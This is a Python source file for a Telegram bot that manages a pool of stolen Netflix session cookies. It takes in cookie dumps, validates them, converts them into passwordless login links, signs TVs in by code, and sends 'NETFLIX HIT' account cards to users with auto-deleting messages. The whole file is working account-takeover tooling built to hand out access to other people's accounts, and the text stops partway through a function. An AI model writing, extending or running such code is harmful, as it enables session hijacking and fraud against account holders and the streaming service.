import hashlib
import html
import io
import json
import os
import re
import signal
import sys
import threading
import time
from datetime import datetime, timedelta, timezone

import requests

from nftoken import (
    MAX_COOKIES,
    activate_tv_with_nftoken,
    build_nftoken_link,
    build_tv_nftoken_link,
    extract_cookie_entries,
    extract_cookie_entries_from_zip,
    fetch_nftoken,
    format_expiry,
)

TOKEN_FILE = "bot_token.txt"
POOL_FILE = os.environ.get("POOL_FILE", "cookie_pool.json")
# Add Telegram numeric user IDs here (e.g. {123456789}) to restrict access, or leave empty to allow all.
ALLOWED_USER_IDS = set()
INLINE_LIMIT = 5
POLL_TIMEOUT = 5
STATUS_TTL_SECONDS = 10
RESULT_TTL_SECONDS = 600
RECHECK_INTERVAL_SECONDS = 24 * 60 * 60
MAX_UPLOAD_BYTES = 10 * 1024 * 1024
# Temporary cycling mode: rotate valid cookies to the back of the pool instead of retiring them.
CYCLE_USED_COOKIES = True


def get_bot_token():
    env_token = os.environ.get("TG_BOT_TOKEN", "").strip()
    if env_token:
        return env_token

    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r", encoding="utf-8") as file_handle:
            saved = file_handle.read().strip()
        if saved:
            return saved

    if sys.stdin.isatty():
        entered = input("Enter Telegram Bot Token: ").strip()
        if entered:
            with open(TOKEN_FILE, "w", encoding="utf-8") as file_handle:
                file_handle.write(entered + "\n")
            print(f"Saved token to {TOKEN_FILE}.")
            return entered

    raise RuntimeError(f"Set TG_BOT_TOKEN or put your bot token in {TOKEN_FILE}.")


class CookiePool:
    def __init__(self, path=POOL_FILE):
        self.path = path
        self._lock = threading.Lock()
        self._cookies = {}  # netflix_id -> {"added_at": int, "last_checked": int}
        self._used = set()  # sha256 hashes of cookies whose nftoken was already generated
        self._recheck_running = False
        self._last_recheck = 0
        self._load()

    @staticmethod
    def _hash_cookie(cid):
        return hashlib.sha256(cid.encode("utf-8")).hexdigest()

    def _load(self):
        if not os.path.exists(self.path):
            return
        try:
            with open(self.path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if isinstance(data, dict) and isinstance(data.get("cookies"), dict):
                self._cookies = data["cookies"]
                self._last_recheck = int(data.get("last_recheck", 0))
                used = data.get("used", [])
                if isinstance(used, list):
                    self._used = set(used)
        except Exception:
            self._cookies = {}
            self._used = set()

    def _save_locked(self):
        tmp_path = f"{self.path}.tmp"
        payload = {
            "last_recheck": self._last_recheck,
            "cookies": self._cookies,
            "used": list(self._used),
        }
        with open(tmp_path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh)
        os.replace(tmp_path, self.path)

    def count(self):
        with self._lock:
            return len(self._cookies)

    def last_recheck(self):
        with self._lock:
            return self._last_recheck

    @staticmethod
    def _normalize_entry(item):
        if isinstance(item, dict):
            return item.get("cookie", ""), dict(item.get("info") or {})
        return str(item), {}

    def add_many(self, cookies):
        now = int(time.time())
        added = 0
        skipped = 0
        with self._lock:
            for item in cookies:
                cid, info = self._normalize_entry(item)
                is_used = (not CYCLE_USED_COOKIES) and (self._hash_cookie(cid) in self._used)
                if not cid or cid in self._cookies or is_used:
                    skipped += 1
                else:
                    self._cookies[cid] = {"added_at": now, "last_checked": 0, "info": info}
                    added += 1
            if added:
                self._save_locked()
            total = len(self._cookies)
        return added, skipped, total

    def add_validated(self, cookies):
        now = int(time.time())
        candidates = []
        skipped = 0

        with self._lock:
            seen_batch = set()
            for item in cookies:
                cid, info = self._normalize_entry(item)
                is_used = (not CYCLE_USED_COOKIES) and (self._hash_cookie(cid) in self._used)
                if not cid or cid in seen_batch or cid in self._cookies or is_used:
                    skipped += 1
                    continue
                seen_batch.add(cid)
                candidates.append((cid, info))

        added = 0
        wasted = 0
        net_err = 0

        with requests.Session() as session:
            for cid, info in candidates:
                try:
                    fetch_nftoken(cid, session=session)
                    with self._lock:
                        is_used = (not CYCLE_USED_COOKIES) and (self._hash_cookie(cid) in self._used)
                        if cid not in self._cookies and not is_used:
                            self._cookies[cid] = {"added_at": now, "last_checked": now, "info": info}
                            added += 1
                except ValueError:
                    wasted += 1
                except requests.RequestException:
                    net_err += 1

        with self._lock:
            if added:
                self._save_locked()
            total = len(self._cookies)

        return added, wasted, skipped, net_err, total

    def pop_valid_cookie(self):
        with requests.Session() as session:
            checked = 0
            while True:
                with self._lock:
                    if not self._cookies or checked >= len(self._cookies):
                        return None
                    cid = next(iter(self._cookies))
                    entry_data = self._cookies.pop(cid)
                    self._save_locked()

                checked += 1
                info = entry_data.get("info") or {}
                try:
                    token, expires = fetch_nftoken(cid, session=session)
                    with self._lock:
                        if CYCLE_USED_COOKIES:
                            self._cookies[cid] = entry_data
                        else:
                            self._used.add(self._hash_cookie(cid))
                        self._save_locked()
                    return cid, token, expires, info
                except ValueError:
                    continue
                except requests.RequestException:
                    with self._lock:
                        self._cookies[cid] = entry_data
                        self._save_locked()
                    return None

    def pop_valid(self, count=1):
        results = []
        wasted = 0
        with requests.Session() as session:
            checked = 0
            while len(results) < count:
                with self._lock:
                    if not self._cookies or checked >= len(self._cookies):
                        break
                    cid = next(iter(self._cookies))
                    entry_data = self._cookies.pop(cid)
                    self._save_locked()

                checked += 1
                info = entry_data.get("info") or {}
                try:
                    token, expires = fetch_nftoken(cid, session=session)
                    with self._lock:
                        if CYCLE_USED_COOKIES:
                            self._cookies[cid] = entry_data
                        else:
                            self._used.add(self._hash_cookie(cid))
                        self._save_locked()
                    results.append((build_nftoken_link(token), expires, info))
                except ValueError:
                    wasted += 1
                except requests.RequestException:
                    # Keep cookie if the request failed due to a transient network error.
                    with self._lock:
                        self._cookies[cid] = entry_data
                        self._save_locked()
                    break

        return results, wasted, self.count()

    def recheck_all(self):
        with self._lock:
            if self._recheck_running:
                return None
            self._recheck_running = True
            snapshot = list(self._cookies.keys())

        valid = 0
        wasted = 0
        errors = 0
        now = int(time.time())

        try:
            with requests.Session() as session:
                for cid in snapshot:
                    try:
                        fetch_nftoken(cid, session=session)
                        with self._lock:
                            if cid in self._cookies:
                                self._cookies[cid]["last_checked"] = now
                        valid += 1
                    except ValueError:
                        with self._lock:
                            self._cookies.pop(cid, None)
                        wasted += 1
                    except requests.RequestException:
                        errors += 1

            with self._lock:
                self._last_recheck = now
                self._save_locked()
                remaining = len(self._cookies)
        finally:
            with self._lock:
                self._recheck_running = False

        return valid, wasted, errors, remaining


class TelegramBot:
    def __init__(self, token):
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.file_url = f"https://api.telegram.org/file/bot{token}"
        self.tg = requests.Session()
        self.poll_session = requests.Session()
        self._lock = threading.Lock()

    def call(self, method, data=None, files=None, timeout=35, retries=3, use_poll_session=False):
        last_exc = None
        for attempt in range(retries):
            try:
                if use_poll_session:
                    resp = self.poll_session.post(
                        f"{self.base_url}/{method}",
                        data=data,
                        files=files,
                        timeout=timeout,
                    )
                else:
                    with self._lock:
                        resp = self.tg.post(
                            f"{self.base_url}/{method}",
                            data=data,
                            files=files,
                            timeout=timeout,
                        )
                if resp.status_code in (429, 500, 502, 503, 504) and attempt < retries - 1:
                    time.sleep(1.5 * (attempt + 1))
                    continue
                resp.raise_for_status()
                payload = resp.json()
                if not payload.get("ok"):
                    raise RuntimeError(payload.get("description", f"Telegram API error on {method}"))
                return payload["result"]
            except (requests.ConnectionError, requests.Timeout) as exc:
                last_exc = exc
                if attempt < retries - 1:
                    time.sleep(1.5 * (attempt + 1))
                    continue
                raise
            except requests.HTTPError as exc:
                last_exc = exc
                raise
        raise last_exc

    def send_message(self, chat_id, text, reply_to=None, reply_markup=None, parse_mode=None):
        data = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
        if reply_to:
            data["reply_to_message_id"] = reply_to
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        if parse_mode:
            data["parse_mode"] = parse_mode
        return self.call("sendMessage", data=data)

    def answer_callback(self, callback_id, text=None):
        data = {"callback_query_id": callback_id}
        if text:
            data["text"] = text
        try:
            self.call("answerCallbackQuery", data=data, timeout=15)
        except Exception:
            pass

    def edit_message(self, chat_id, message_id, text):
        try:
            self.call(
                "editMessageText",
                data={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": text,
                    "disable_web_page_preview": True,
                },
            )
        except Exception:
            pass

    def delete_message(self, chat_id, message_id):
        try:
            self.call("deleteMessage", data={"chat_id": chat_id, "message_id": message_id}, timeout=15)
        except Exception:
            pass

    def schedule_delete(self, chat_id, message_id, delay_seconds):
        timer = threading.Timer(delay_seconds, self.delete_message, args=(chat_id, message_id))
        timer.daemon = True
        timer.start()

    def send_document(self, chat_id, filename, content_bytes, caption=None, reply_to=None):
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        if reply_to:
            data["reply_to_message_id"] = reply_to
        files = {"document": (filename, io.BytesIO(content_bytes), "text/plain")}
        return self.call("sendDocument", data=data, files=files, timeout=60)

    def send_photo(self, chat_id, photo_bytes, caption=None, reply_markup=None, parse_mode=None):
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        if parse_mode:
            data["parse_mode"] = parse_mode
        files = {"photo": ("account.png", io.BytesIO(photo_bytes), "image/png")}
        return self.call("sendPhoto", data=data, files=files, timeout=60)

    def download_file_bytes(self, file_id):
        info = self.call("getFile", data={"file_id": file_id})
        file_path = info["file_path"]
        resp = self.tg.get(f"{self.file_url}/{file_path}", timeout=60)
        resp.raise_for_status()
        return resp.content


def process_cookies(entries):
    results = []
    failed = 0
    with requests.Session() as session:
        for item in entries:
            cid = item["cookie"] if isinstance(item, dict) else item
            info = (item.get("info") or {}) if isinstance(item, dict) else {}
            try:
                token, expires = fetch_nftoken(cid, session=session)
                results.append((build_nftoken_link(token), expires, info))
            except (requests.RequestException, ValueError):
                failed += 1
    return results, failed


COUNTRY_TIMEZONES = {
    "AE": ("Asia/Dubai", "GST", 4.0),
    "AR": ("America/Argentina/Buenos_Aires", "ART", -3.0),
    "AT": ("Europe/Vienna", "CET", 1.0),
    "AU": ("Australia/Sydney", "AEST", 10.0),
    "BD": ("Asia/Dhaka", "BST", 6.0),
    "BE": ("Europe/Brussels", "CET", 1.0),
    "BR": ("America/Sao_Paulo", "BRT", -3.0),
    "CA": ("America/Toronto", "EST", -5.0),
    "CH": ("Europe/Zurich", "CET", 1.0),
    "CL": ("America/Santiago", "CLT", -4.0),
    "CO": ("America/Bogota", "COT", -5.0),
    "DE": ("Europe/Berlin", "CET", 1.0),
    "DK": ("Europe/Copenhagen", "CET", 1.0),
    "EG": ("Africa/Cairo", "EET", 2.0),
    "ES": ("Europe/Madrid", "CET", 1.0),
    "FI": ("Europe/Helsinki", "EET", 2.0),
    "FR": ("Europe/Paris", "CET", 1.0),
    "GB": ("Europe/London", "GMT", 0.0),
    "HK": ("Asia/Hong_Kong", "HKT", 8.0),
    "ID": ("Asia/Jakarta", "WIB", 7.0),
    "IE": ("Europe/Dublin", "GMT", 0.0),
    "IN": ("Asia/Kolkata", "IST", 5.5),
    "IT": ("Europe/Rome", "CET", 1.0),
    "JP": ("Asia/Tokyo", "JST", 9.0),
    "KR": ("Asia/Seoul", "KST", 9.0),
    "MX": ("America/Mexico_City", "CST", -6.0),
    "MY": ("Asia/Kuala_Lumpur", "MYT", 8.0),
    "NG": ("Africa/Lagos", "WAT", 1.0),
    "NL": ("Europe/Amsterdam", "CET", 1.0),
    "NO": ("Europe/Oslo", "CET", 1.0),
    "NZ": ("Pacific/Auckland", "NZST", 12.0),
    "PE": ("America/Lima", "PET", -5.0),
    "PH": ("Asia/Manila", "PHT", 8.0),
    "PL": ("Europe/Warsaw", "CET", 1.0),
    "PT": ("Europe/Lisbon", "WET", 0.0),
    "RO": ("Europe/Bucharest", "EET", 2.0),
    "RU": ("Europe/Moscow", "MSK", 3.0),
    "SA": ("Asia/Riyadh", "AST", 3.0),
    "SE": ("Europe/Stockholm", "CET", 1.0),
    "SG": ("Asia/Singapore", "SGT", 8.0),
    "TH": ("Asia/Bangkok", "ICT", 7.0),
    "TR": ("Europe/Istanbul", "TRT", 3.0),
    "TW": ("Asia/Taipei", "CST", 8.0),
    "UA": ("Europe/Kyiv", "EET", 2.0),
    "UK": ("Europe/London", "GMT", 0.0),
    "US": ("America/New_York", "EST", -5.0),
    "VN": ("Asia/Ho_Chi_Minh", "ICT", 7.0),
    "ZA": ("Africa/Johannesburg", "SAST", 2.0),
}


def _resolve_country_tz(info):
    country_raw = (info or {}).get("Country") or (info or {}).get("Region") or ""
    match = re.match(r"^\s*([A-Za-z]{2})\b", str(country_raw))
    if not match:
        return timezone.utc, "UTC"

    code = match.group(1).upper()
    entry = COUNTRY_TIMEZONES.get(code)
    if not entry:
        return timezone.utc, "UTC"

    iana_name, abbr, offset_hours = entry
    try:
        from zoneinfo import ZoneInfo

        tz = ZoneInfo(iana_name)
        now_abbr = datetime.now(tz).tzname() or abbr
        return tz, now_abbr
    except Exception:
        return timezone(timedelta(hours=offset_hours)), abbr


def _format_expiry_for_country(expires, info=None):
    if not isinstance(expires, (int, float)):
        return "UTC", "Unknown"
    tz, tz_label = _resolve_country_tz(info)
    dt = datetime.fromtimestamp(expires, tz=tz)
    rem = max(0, int(expires - time.time()))
    hrs, rem = divmod(rem, 3600)
    mins, secs = divmod(rem, 60)
    return tz_label, f"{dt.strftime('%Y-%m-%d %H:%M:%S')} {tz_label} (Remaining: {hrs}h {mins:02d}m {secs:02d}s)"


def format_results_text(results):
    blocks = []
    for item in results:
        url, expires = item[0], item[1]
        info = item[2] if len(item) > 2 else {}
        lines = [f"Login URL : {url}", f"Expires   : {format_expiry(expires)}"]
        if info:
            lines.append("Account   :")
            for k, v in info.items():
                lines.append(f"  - {k}: {v}")
        blocks.append("\n".join(lines))
    return "\n\n".join(blocks)


def _load_ui_fonts():
    from PIL import ImageFont

    for regular, bold in (
        ("C:\\Windows\\Fonts\\segoeui.ttf", "C:\\Windows\\Fonts\\segoeuib.ttf"),
        ("C:\\Windows\\Fonts\\arial.ttf", "C:\\Windows\\Fonts\\arialbd.ttf"),
    ):
        if os.path.exists(regular) and os.path.exists(bold):
            return ImageFont.truetype(regular, 18), ImageFont.truetype(bold, 18)
    default = ImageFont.load_default()
    return default, default


def _wrap_text_lines(draw, text, font, max_width):
    lines = []
    for para in str(text).splitlines() or [""]:
        words = para.split(" ")
        current = ""
        for word in words:
            candidate = f"{current} {word}".strip()
            if draw.textlength(candidate, font=font) <= max_width:
                current = candidate
            else:
                if current:
                    lines.append(current)
                current = word
        if current or not para:
            lines.append(current)
    return lines or [""]


def render_account_table_png(expires, info):
    from PIL import Image, ImageDraw

    font_reg, font_bold = _load_ui_fonts()
    col1_w = 240
    col2_w = 420
    pad_x = 16
    pad_y = 10
    line_h = 24
    total_w = col1_w + col2_w

    rows = list(info.items()) if info else []
    rows.append(("Valid Till (UTC)", _format_utc_and_remaining(expires)))

    dummy = Image.new("RGB", (total_w, 100), "white")
    d_draw = ImageDraw.Draw(dummy)

    wrapped_rows = []
    total_h = 44 + 42  # header + hit banner
    for k, v in rows:
        k_lines = _wrap_text_lines(d_draw, k, font_reg, col1_w - 2 * pad_x)
        v_lines = _wrap_text_lines(d_draw, v, font_reg, col2_w - 2 * pad_x)
        n_lines = max(len(k_lines), len(v_lines))
        row_h = n_lines * line_h + 2 * pad_y
        wrapped_rows.append((k_lines, v_lines, row_h))
        total_h += row_h

    img = Image.new("RGB", (total_w + 1, total_h + 1), "#FFFFFF")
    draw = ImageDraw.Draw(img)

    border = "#D1D5DB"
    header_bg = "#F3F4F6"
    blue_fg = "#2B7A9E"
    dark_fg = "#111827"
    green_fg = "#15803D"

    # Header row
    draw.rectangle([0, 0, total_w, 44], fill=header_bg, outline=border)
    draw.line([col1_w, 0, col1_w, 44], fill=border)
    draw.text((col1_w // 2, 22), "INFO", fill=dark_fg, font=font_bold, anchor="mm")
    draw.text((col1_w + col2_w // 2, 22), "DETAILS", fill=dark_fg, font=font_bold, anchor="mm")

    # Hit row
    y = 44
    draw.rectangle([0, y, total_w, y + 42], fill="#FFFFFF", outline=border)
    draw.text((pad_x, y + 21), "NETFLIX HIT", fill=green_fg, font=font_bold, anchor="lm")
    y += 42

    for k_lines, v_lines, row_h in wrapped_rows:
        draw.rectangle([0, y, total_w, y + row_h], fill="#FFFFFF", outline=border)
        draw.line([col1_w, y, col1_w, y + row_h], fill=border)
        for i, line in enumerate(k_lines):
            draw.text((pad_x, y + pad_y + i * line_h), line, fill=blue_fg, font=font_reg)
        for i, line in enumerate(v_lines):
            draw.text((col1_w + pad_x, y + pad_y + i * line_h), line, fill=dark_fg, font=font_reg)
        y += row_h

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def format_account_card_caption():
    return (
        "<b>🎉 HERE IS YOUR NETFLIX ACCOUNT!</b>\n"
        "<blockquote>CLICK THE BUTTONS BELOW TO GET YOUR LOGIN LINKS.\n"
        "⚠️ This message auto-deletes in 10 minutes.</blockquote>"
    )


def format_account_card_table_html(expires, info):
    rows = list(info.items()) if info else []
    tz_label, valid_text = _format_expiry_for_country(expires, info)
    rows.append((f"Valid Till ({tz_label})", valid_text))
    tr_rows = [
        "<tr><th>ɪɴғᴏ</th><th>ᴅᴇᴛᴀɪʟs</th></tr>",
        "<tr><td colspan=\"2\">✅ ɴᴇᴛғʟɪx ʜɪᴛ</td></tr>",
    ]
    for k, v in rows:
        tr_rows.append(f"<tr><td>{html.escape(str(k))}</td><td>{html.escape(str(v))}</td></tr>")

    return (
        "<b>🎉 ʜᴇʀᴇ ɪs ʏᴏᴜʀ ɴᴇᴛғʟɪx ᴀᴄᴄᴏᴜɴᴛ!</b>\n\n"
        f"<table>{''.join(tr_rows)}</table>\n\n"
        "<blockquote>ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ʟᴏɢɪɴ ʟɪɴᴋs.\n"
        "⚠️ Auto-deletes in 10 minutes.</blockquote>"
    )


def format_account_card_html(url, expires, info):
    rows = list(info.items()) if info else []
    tz_label, valid_text = _format_expiry_for_country(expires, info)
    rows.append((f"Valid Till ({tz_label})", valid_text))
    lines = [
        "<b>🎉 ʜᴇʀᴇ ɪs ʏᴏᴜʀ ɴᴇᴛғʟɪx ᴀᴄᴄᴏᴜɴᴛ!</b>",
        "",
        "<b>ɪɴғᴏ | ᴅᴇᴛᴀɪʟs</b>",
        "<b>✅ ɴᴇᴛғʟɪx ʜɪᴛ</b>",
    ]
    for k, v in rows:
        lines.append(f"<code>{html.escape(str(k))}</code> | {html.escape(str(v))}")
    lines.append("")
    lines.append(
        "<blockquote>ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ʟᴏɢɪɴ ʟɪɴᴋs.\n"
        "⚠️ Auto-deletes in 10 minutes.</blockquote>"
    )
    return "\n".join(lines)


def _login_keyboard(url):
    return {
        "inline_keyboard": [
            [
                {"text": "📱 PHONE LOGIN", "url": url},
                {"text": "🖥 PC LOGIN", "url": url},
            ],
            [
                {"text": "📺 Paste 6-Digit TV Code", "callback_data": "tv_prompt"},
                {"text": "Generate Another", "callback_data": "generate:1"},
            ],
            [
                {"text": "Pool Status", "callback_data": "pool"},
            ],
        ]
    }


REFILL_CHATS = set()


def _menu_keyboard(chat_id):
    refill_label = "Refill Mode: ON" if chat_id in REFILL_CHATS else "Refill Mode: OFF"
    return {
        "inline_keyboard": [
            [
                {"text": "Generate", "callback_data": "generate:1"},
                {"text": "Pool Status", "callback_data": "pool"},
            ],
            [
                {"text": refill_label, "callback_data": "refill:toggle"},
                {"text": "Recheck Now", "callback_data": "recheck"},
            ],
        ]
    }


def _send_inline_account_card(bot, chat_id, url, expires, info):
    try:
        result_msg = bot.send_message(
            chat_id,
            format_account_card_table_html(expires, info),
            reply_markup=_login_keyboard(url),
            parse_mode="HTML",
        )
    except requests.HTTPError:
        result_msg = bot.send_message(
            chat_id,
            format_account_card_html(url, expires, info),
            reply_markup=_login_keyboard(url),
            parse_mode="HTML",
        )
    bot.schedule_delete(chat_id, result_msg["message_id"], RESULT_TTL_SECONDS)


def _send_generated_results(bot, chat_id, status_msg_id, results, wasted, remaining):
    if not results:
        bot.edit_message(
            chat_id,
            status_msg_id,
            f"No working cookies left (wasted: {wasted}, pool: {remaining}). (Auto-deletes in 10s)",
        )
        bot.schedule_delete(chat_id, status_msg_id, STATUS_TTL_SECONDS)
        return

    bot.edit_message(
        chat_id,
        status_msg_id,
        f"Generated {len(results)} | wasted: {wasted} | pool: {remaining} (Auto-deletes in 10s)",
    )
    bot.schedule_delete(chat_id, status_msg_id, STATUS_TTL_SECONDS)

    if len(results) <= INLINE_LIMIT:
        for url, expires, info in results:
            _send_inline_account_card(bot, chat_id, url, expires, info)
    else:
        output_text = format_results_text(results)
        result_msg = bot.send_document(
            chat_id,
            "NFTOKEN.TXT",
            (output_text + "\n").encode("utf-8"),
            caption=f"{len(results)} token(s) | pool: {remaining}\nWarning: this file auto-deletes in 10 minutes.",
        )
        bot.schedule_delete(chat_id, result_msg["message_id"], RESULT_TTL_SECONDS)


def _run_refill_async(bot, pool, chat_id, cookies):
    added, wasted, skipped, net_err, total = pool.add_validated(cookies)
    msg_out = bot.send_message(
        chat_id,
        f"Refill done: +{added} valid, {wasted} wasted, {skipped} dup/used, {net_err} net err. Pool: {total}. (Auto-deletes in 10s)",
        reply_markup=_menu_keyboard(chat_id),
    )
    bot.schedule_delete(chat_id, msg_out["message_id"], STATUS_TTL_SECONDS)


def _run_tv_login_async(bot, pool, chat_id, status_msg_id, clean_code):
    picked = pool.pop_valid_cookie()
    if not picked:
        bot.edit_message(chat_id, status_msg_id, "No working cookies in pool. (Auto-deletes in 10s)")
        bot.schedule_delete(chat_id, status_msg_id, STATUS_TTL_SECONDS)
        return

    _cid, token, expires, info = picked
    try:
        final_url, snippet = activate_tv_with_nftoken(token, clean_code)
        bot.edit_message(
            chat_id,
            status_msg_id,
            f"TV code {clean_code} submitted ({final_url}). {snippet[:100]} | Pool: {pool.count()}. (Auto-deletes in 10s)",
        )
    except Exception as exc:
        bot.edit_message(
            chat_id,
            status_msg_id,
            f"TV auto-login failed ({exc}). Use TV LOGIN button below. (Auto-deletes in 10s)",
        )
    bot.schedule_delete(chat_id, status_msg_id, STATUS_TTL_SECONDS)
    _send_inline_account_card(bot, chat_id, build_nftoken_link(token), expires, info)


def _run_recheck_async(bot, pool, chat_id, status_msg_id):
    res = pool.recheck_all()
    if res is None:
        bot.edit_message(chat_id, status_msg_id, "Recheck already in progress. (Auto-deletes in 10s)")
    else:
        valid, wasted, errors, remaining = res
        bot.edit_message(
            chat_id,
            status_msg_id,
            f"Recheck done: {valid} valid, {wasted} wasted, {errors} net err, {remaining} in pool. (Auto-deletes in 10s)",
        )
    bot.schedule_delete(chat_id, status_msg_id, STATUS_TTL_SECONDS)


def handle_callback(bot, pool, callback):
    cb_id = callback["id"]
    msg = callback.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    user_id = (callback.get("from") or {}).get("id")

    if not chat_id or (ALLOWED_USER_IDS and user_id not in ALLOWED_USER_IDS):
        bot.answer_callback(cb_id)
        return

    data = callback.get("data") or ""
    if data.startswith("generate:"):
        bot.answer_callback(cb_id, "Generating...")
        try:
            count = max(1, min(50, int(data.split(":", 1)[1])))
        except ValueError:
            count = 1
        status_msg = bot.send_message(chat_id, f"Checking pool for {count} valid cookie(s)...")
        results, wasted, remaining = pool.pop_valid(count)
        _send_generated_results(bot, chat_id, status_msg["message_id"], results, wasted, remaining)
    elif data == "refill:toggle":
        if chat_id in REFILL_CHATS:
            REFILL_CHATS.discard(chat_id)
            state = "OFF"
        else:
            REFILL_CHATS.add(chat_id)
            state = "ON"
        bot.answer_callback(cb_id, f"Refill Mode: {state}")
        status_msg = bot.send_message(
            chat_id,
            f"Refill Mode is now {state}. Pool: {pool.count()} cookie(s). (Auto-deletes in 10s)",
            reply_markup=_menu_keyboard(chat_id),
        )
        bot.schedule_delete(chat_id, status_msg["message_id"], STATUS_TTL_SECONDS)
    elif data == "tv_prompt":
        bot.answer_callback(cb_id)
        msg_out = bot.send_message(
            chat_id,
            "Send your 6-digit TV code (e.g. 123456) to link a valid pool cookie. (Auto-deletes in 10s)",
        )
        bot.schedule_delete(chat_id, msg_out["message_id"], STATUS_TTL_SECONDS)
    elif data == "pool":
        bot.answer_callback(cb_id)
        state = "ON" if chat_id in REFILL_CHATS else "OFF"
        status_msg = bot.send_message(
            chat_id,
            f"Pool: {pool.count()} cookie(s) | Refill Mode: {state} (Auto-deletes in 10s)",
            reply_markup=_menu_keyboard(chat_id),
        )
        bot.schedule_delete(chat_id, status_msg["message_id"], STATUS_TTL_SECONDS)
    elif data == "recheck":
        bot.answer_callback(cb_id, "Starting recheck...")
        status_msg = bot.send_message(chat_id, f"Rechecking {pool.count()} cookie(s)...")
        threading.Thread(
            target=_run_recheck_async,
            args=(bot, pool, chat_id, status_msg["message_id"]),
            daemon=True,
        ).start()
    else:
        bot.answer_callback(cb_id)


def handle_message(bot, pool, message):
    chat_id = message["chat"]["id"]
    msg_id = message["message_id"]
    user_id = (message.get("from") or {}).get("id")

    if ALLOWED_USER_IDS and user_id not in ALLOWED_USER_IDS:
        return

    text = (message.get("text") or "").strip()
    doc = message.get("document")
    cmd = text.split()[0].lower() if text.startswith("/") else ""

    if cmd in ("/start", "/help", "/menu"):
        bot.delete_message(chat_id, msg_id)
        help_msg = bot.send_message(
            chat_id,
            (
                f"Pool: {pool.count()} cookie(s) | Rechecks every 24h\n"
                "/generate [n] - get NFTOKEN from valid pool cookie\n"
                "/tv <code> - link 6-digit TV code (or just paste the 6 digits)\n"
                "/refill [on|off] - store sent cookies into pool\n"
                "/pool - check pool count\n"
                "/recheck - validate all pool cookies now\n"
                "Warning: inputs delete immediately, status in 10s, results in 10m."
            ),
            reply_markup=_menu_keyboard(chat_id),
        )
        bot.schedule_delete(chat_id, help_msg["message_id"], RESULT_TTL_SECONDS)
        return

    if cmd == "/tv" or (not doc and re.fullmatch(r"\d{6,8}", re.sub(r"[\s\-]+", "", text))):
        bot.delete_message(chat_id, msg_id)
        code = text.split(None, 1)[1].strip() if cmd == "/tv" and len(text.split()) > 1 else text
        clean_code = re.sub(r"[\s\-]+", "", code)
        if not re.fullmatch(r"\d{6,8}", clean_code):
            err_msg = bot.send_message(chat_id, "Usage: /tv 123456 (or paste 6-8 digits). (Auto-deletes in 10s)")
            bot.schedule_delete(chat_id, err_msg["message_id"], STATUS_TTL_SECONDS)
            return

        status_msg = bot.send_message(chat_id, f"Auto-logging TV code {clean_code} with valid NFTOKEN...")
        threading.Thread(
            target=_run_tv_login_async,
            args=(bot, pool, chat_id, status_msg["message_id"], clean_code),
            daemon=True,
        ).start()
        return

    if cmd == "/refill":
        bot.delete_message(chat_id, msg_id)
        arg = text.split()[1].lower() if len(text.split()) > 1 else "toggle"
        if arg == "on":
            REFILL_CHATS.add(chat_id)
        elif arg == "off":
            REFILL_CHATS.discard(chat_id)
        else:
            if chat_id in REFILL_CHATS:
                REFILL_CHATS.discard(chat_id)
            else:
                REFILL_CHATS.add(chat_id)
        state = "ON" if chat_id in REFILL_CHATS else "OFF"
        msg_out = bot.send_message(
            chat_id,
            f"Refill Mode: {state}. Send text, .txt/.json, or .zip to store cookies. (Auto-deletes in 10s)",
            reply_markup=_menu_keyboard(chat_id),
        )
        bot.schedule_delete(chat_id, msg_out["message_id"], STATUS_TTL_SECONDS)
        return

    if cmd in ("/generate", "/gen"):
        bot.delete_message(chat_id, msg_id)
        parts = text.split()
        try:
            count = max(1, min(50, int(parts[1]))) if len(parts) > 1 else 1
        except ValueError:
            count = 1
        status_msg = bot.send_message(chat_id, f"Checking pool for {count} valid cookie(s)...")
        results, wasted, remaining = pool.pop_valid(count)
        _send_generated_results(bot, chat_id, status_msg["message_id"], results, wasted, remaining)
        return

    if cmd in ("/pool", "/status"):
        bot.delete_message(chat_id, msg_id)
        state = "ON" if chat_id in REFILL_CHATS else "OFF"
        msg_out = bot.send_message(
            chat_id,
            f"Pool: {pool.count()} cookie(s) | Refill Mode: {state} (Auto-deletes in 10s)",
            reply_markup=_menu_keyboard(chat_id),
        )
        bot.schedule_delete(chat_id, msg_out["message_id"], STATUS_TTL_SECONDS)
        return

    if cmd == "/recheck":
        bot.delete_message(chat_id, msg_id)
        status_msg = bot.send_message(chat_id, f"Rechecking {pool.count()} cookie(s)...")
        threading.Thread(
            target=_run_recheck_async,
            args=(bot, pool, chat_id, status_msg["message_id"]),
            daemon=True,
        ).start()
        return

    cookies = []
    if doc:
        if (doc.get("file_size") or 0) > MAX_UPLOAD_BYTES:
            bot.delete_message(chat_id, msg_id)
            err_msg = bot.send_message(chat_id, "File exceeds 10 MB limit. (Auto-deletes in 10s)")
            bot.schedule_delete(chat_id, err_msg["message_id"], STATUS_TTL_SECONDS)
            return

        try:
            raw_bytes = bot.download_file_bytes(doc["file_id"])
        except Exception as exc:
            bot.delete_message(chat_id, msg_id)
            err_msg = bot.send_message(chat_id, f"Failed to download file: {exc} (Auto-deletes in 10s)")
            bot.schedule_delete(chat_id, err_msg["message_id"], STATUS_TTL_SECONDS)
            return

        bot.delete_message(chat_id, msg_id)
        filename = (doc.get("file_name") or "").lower()
        if filename.endswith(".zip") or raw_bytes.startswith(b"PK\x03\x04"):
            try:
                cookies = extract_cookie_entries_from_zip(raw_bytes, limit=MAX_COOKIES)
            except Exception as exc:
                err_msg = bot.send_message(chat_id, f"Failed to read zip: {exc} (Auto-deletes in 10s)")
